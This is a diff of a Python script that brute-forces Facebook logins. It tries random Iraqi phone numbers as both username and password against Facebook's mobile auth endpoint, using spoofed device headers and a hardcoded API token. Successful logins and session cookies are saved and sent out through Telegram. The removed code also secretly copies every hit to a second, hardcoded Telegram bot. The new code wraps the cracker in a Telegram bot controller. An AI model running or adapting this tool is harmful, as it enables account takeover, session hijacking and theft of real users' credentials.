-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)"
-]
-"GGGGGGG"
-
+# ---- Payload builder (same as original) ----
 def pm(email_or_phone, password):
     device_id = str(uuid.uuid4())
     family_device_id = str(uuid.uuid4())
     secure_family_device_id = str(uuid.uuid4())
     adid = str(uuid.uuid4())
-    current_timestamp = int(time.time())
-    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
-    payload = {
+    ts = int(time.time())
+    pwd_enc = f"#PWD_FB4A:0:{ts}:{password}"
+    return {
         "adid": adid,
         "format": "json",
         "device_id": device_id,
@@ -1429,159 +97,188 @@ def pm(email_or_phone, password):
         "api_key": "882a8490361da98702bf97a021ddc14d",
         "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
     }
-    payload = {
-    "adid": adid,
-    "format": "json",
-    "device_id": device_id,
-    "email": email_or_phone,
-    "password": pwd_enc,
-    "generate_analytics_claim": "1",
-    "community_id": "",
-    "cpl": "true",
-    "try_num": "1",
-    "family_device_id": family_device_id,
-    "secure_family_device_id": secure_family_device_id,
-    "credentials_type": "password",
-    "generate_session_cookies": "1",
-    "error_detail_type": "button_with_disabled",
-    "source": "login",
-    "generate_machine_id": "1",
-    "currently_logged_in_userid": "0",
-    "locale": "ar_AR",
-    "client_country_code": "EG",
-    "fb_api_req_friendly_name": "authenticate",
-    "fb_api_caller_class": "Fb4aAuthHandler",
-    "api_key": "882a8490361da98702bf97a021ddc14d",
-    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-  }
-    return payload
 
-def tele(msg, token, idas):
+# ---- One attempt ----
+def crack_one(ids, pw):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Content-Length": "0",
+        "Origin": "https://m.facebook.com",
+        "Referer": "https://m.facebook.com/?deoia=1",
+        "Sec-CH-UA": '"Chromium";v="139", "Not;A=Brand";v="99"',
+        "Sec-CH-UA-Mobile": "?1",
+        "Sec-CH-UA-Platform": '"Android"',
+        "Sec-CH-UA-Platform-Version": '"10.0.0"',
+        "Sec-CH-UA-Model": '"STK-L21"',
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "no-cors",
+        "Sec-Fetch-Dest": "empty",
+        "x-fb-connection-quality": "EXCELLENT",
+        "x-fb-friendly-name": "authenticate",
+        "x-fb-http-engine": "Liger",
+        "x-fb-client-ip": "True",
+        "x-fb-server-cluster": "True",
+    }
+    data = pm(ids, pw)
     try:
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id":idas, "text":msg})
-    except:
-        pass
+        req = requests.post("https://b-graph.facebook.com/auth/login",
+                            headers=headers, data=data, timeout=15).json()
+    except Exception:
+        return "dead"
 
-def NOON(msg):
-    try:
-        requests.post("https://api.telegram.org/bot8623152QAW8l_hTHPa1iljz2wq7ZIhh0/sendMessage", data={"chat_id":"86195", "text":msg})
-    except:
-        pass
+    if "session_key" in req:
+        cookies = req.get("session_cookies", [])
+        cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies) if cookies else ""
+        with lock:
+            state["ok"] += 1
+        line = f"{ids} | {pw} | {cookie_str}"
+        with open(HITS_FILE, "a") as f:
+            f.write(line + "\n")
+        tg_send(f"OK\n{ids}\n{pw}\n{cookie_str}")
+        return "ok"
+    elif "www.facebook.com" in req.get("error", {}).get("message", ""):
+        with lock:
+            state["cp"] += 1
+        with open(CP_FILE, "a") as f:
+            f.write(f"{ids}|{pw}\n")
+        tg_send(f"CP\n{ids}\n{pw}")
+        return "cp"
+    return "no"
 
-def crackfree(ids, pwxs, token, idas):
-    global ok_noon, loop_noon, cp_noon
-    sys.stdout.write(f"\r{W}[{F}={W}]{F} [WARIOR] [{W}{loop_noon}{G}/{W}{ok_noon}{G}/{W}{cp_noon}{G}]")
-    sys.stdout.flush()
-    for pw in pwxs:
-        success = False
-        max_retries = 3  
-        for attempt in range(max_retries):
-            try:
-                
-                ua = random.choice(Ahmad)
-                headers = {
-                    "User-Agent": ua,
-                    "Accept-Encoding": "gzip, deflate",
-                    "x-fb-connection-quality": "EXCELLENT",
-                    "x-fb-friendly-name": "authenticate",
-                    "x-fb-http-engine": "Liger",
-                    "x-fb-client-ip": "True",
-                    "x-fb-server-cluster": "True",
-                    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                }
-                headers = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
-    "Content-Length": "0",
-    "Origin": "https://m.facebook.com",
-    "Referer": "https://m.facebook.com/?deoia=1",
-    "Sec-CH-UA": '"Chromium";v="139", "Not;A=Brand";v="99"',
-    "Sec-CH-UA-Mobile": "?1",
-    "Sec-CH-UA-Platform": '"Android"',
-    "Sec-CH-UA-Platform-Version": '"10.0.0"',
-    "Sec-CH-UA-Full-Version-List": '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
-    "Sec-CH-UA-Model": '"STK-L21"',
-    "Sec-CH-Prefers-Color-Scheme": "light",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-Mode": "no-cors",
-    "Sec-Fetch-Dest": "empty",
-    "x-fb-connection-quality": "EXCELLENT",
-    "x-fb-friendly-name": "authenticate",
-    "x-fb-http-engine": "Liger",
-    "x-fb-client-ip": "True",
-    "x-fb-server-cluster": "True",
-}
-                data = pm(ids, pw)
-                req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()
-                
-                if 'session_key' in req:
-                    ok_noon += 1
-                    cookies = req.get('session_cookies', [])
-                    if cookies:
-                        cookie_str = '; '.join([f"{c['name']}={c['value']}" for c in cookies])
-                        print(f"\n\033[0;32m\033[1m{W}[{F}1{W}]{F} [WARIOR-OK] {ids} | {pw} | {cookie_str}\033[0m")
-                    else:
-                        print(f"\n\033[0;32m\033[1m{W}[{F}1{W}]{F} [WARIOR-OK] {ids} | {pw}\033[0m")
-                    noon()
-                    open('/storage/emulated/0/WARIOR.ok.txt','a').write(f'{ids}|{pw}\n')
-                    tele(f"""OK
-{ids}
-{pw}
-By: @o1_rt2""", token, idas)
-                    NOON(f"""OK
-{ids}
-{pw}
-By: @o1_rt2""")
-                    success = True
-                    break
-                elif 'www.facebook.com' in req.get("error", {}).get("message", ""):
-                    cp_noon += 1
-                    print(f"\n\x1b[38;5;208m\033[1m{W}[{F}={W}]{F} [WARIOR-CP] {ids} | {pw}\033[0m")
-                    noon()
-                    open('/storage/emulated/0/WARIOR.cp.txt','a').write(f'{ids}|{pw}\n')
-                    tele(f"""CP
-{ids}
-{pw}
-By: @o1_rt2""", token, idas)
-                    NOON(f"""سكيور بس يفتح ضمان
-رقم {ids}
-بسورد {pw}
-By: @o1_rt2""")
-                    success = True
-                    break
-                else:
-                   
-                    break
-            except requests.exceptions.ConnectionError:
-                
-                time.sleep(1)
+# ---- Worker loop ----
+def worker():
+    global state
+    while not stop_event.is_set():
+        if not state["running"] or not state["prefix"]:
+            time.sleep(1)
+            continue
+        # build a new id
+        nmp = "".join(random.choice("1234509876") for _ in range(7))
+        with lock:
+            if nmp in state["seen"]:
                 continue
-            except Exception as e:
-                
+            state["seen"].add(nmp)
+        ids = state["prefix"] + nmp
+        with lock:
+            state["loop"] += 1
+            state["attempts"] += 1
+        # try a few retries like original
+        for _ in range(3):
+            if stop_event.is_set():
+                return
+            r = crack_one(ids, ids)
+            if r in ("ok", "cp"):
                 break
-        if success:
-            break  
-    loop_noon += 1
+        time.sleep(0.2)
 
-def noon_menu():
-    # Replace the interactive inputs with environment variables
-    token = os.environ.get('TELE_TOKEN')
-    idas = os.environ.get('TELE_ID')
-    
-    clear()
-    print(logo)
-    noon()
-    print(f'{W}[{F}={W}]{F} KOD ([0750] | [0770] | [0780] | [0781] | [0751]) ')
-    
-    # Use an environment variable for the SIM prefix, defaulting to 0770
-    sim = os.environ.get('SIM_PREFIX', '0770')
-    if sim not in ['0750', '0770', '0780', '0781', '0751']:
-        print(f'{W}[{E}1{W}]{E} No')
-        exit()
+def ensure_worker():
+    global worker_thread
+    if worker_thread is None or not worker_thread.is_alive():
+        worker_thread = threading.Thread(target=worker, daemon=True)
+        worker_thread.start()
 
-if __name__ == '__main__':
-    noon_menu()
+# ---- Telegram handlers ----
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    ensure_worker()
+    await update.message.reply_text(
+        "Axiom online, boss man.\n\n"
+        "/setprefix <0750|0770|0780|0781|0751>\n"
+        "/setoutput <token> <chat_id>   (optional forward)\n"
+        "/run  - start cracking\n"
+        "/stop - halt\n"
+        "/stats\n"
+        "/hits - download hits.txt\n"
+        "/cp   - download cp.txt"
+    )
 
+async def cmd_setprefix(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    if not ctx.args or ctx.args[0] not in ("0750","0770","0780","0781","0751"):
+        await update.message.reply_text("Usage: /setprefix 0750 (or 0770/0780/0781/0751)")
+        return
+    with lock:
+        state["prefix"] = ctx.args[0]
+    await update.message.reply_text(f"Prefix set: {ctx.args[0]}")
 
-# --- END OF CAPTURE ---
+async def cmd_setoutput(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    if len(ctx.args) < 2:
+        await update.message.reply_text("Usage: /setoutput <token> <chat_id>")
+        return
+    with lock:
+        state["token"] = ctx.args[0]
+        state["chat_id"] = ctx.args[1]
+    await update.message.reply_text("Output forward set.")
+
+async def cmd_run(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    if not state["prefix"]:
+        await update.message.reply_text("Set a prefix first: /setprefix 0750")
+        return
+    ensure_worker()
+    with lock:
+        state["running"] = True
+    await update.message.reply_text("Running. Fuck yeah.")
+
+async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    with lock:
+        state["running"] = False
+    await update.message.reply_text("Stopped.")
+
+async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    s = state
+    await update.message.reply_text(
+        f"State: {'RUNNING' if s['running'] else 'STOPPED'}\n"
+        f"Prefix: {s['prefix']}\n"
+        f"Attempts: {s['attempts']}\n"
+        f"OK: {s['ok']}\n"
+        f"CP: {s['cp']}\n"
+        f"Loops: {s['loop']}"
+    )
+
+async def cmd_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    try:
+        with open(HITS_FILE, "rb") as f:
+            await update.message.reply_document(document=f, filename=HITS_FILE)
+    except FileNotFoundError:
+        await update.message.reply_text("No hits yet.")
+
+async def cmd_cp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_chat.id != CHAT_ID:
+        return
+    try:
+        with open(CP_FILE, "rb") as f:
+            await update.message.reply_document(document=f, filename=CP_FILE)
+    except FileNotFoundError:
+        await update.message.reply_text("No CP entries yet.")
+
+# ---- Main ----
+def main():
+    ensure_worker()
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("setprefix", cmd_setprefix))
+    app.add_handler(CommandHandler("setoutput", cmd_setoutput))
+    app.add_handler(CommandHandler("run", cmd_run))
+    app.add_handler(CommandHandler("stop", cmd_stop))
+    app.add_handler(CommandHandler("stats", cmd_stats))
+    app.add_handler(CommandHandler("hits", cmd_hits))
+    app.add_handler(CommandHandler("cp", cmd_cp))
+    print("Bot polling...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
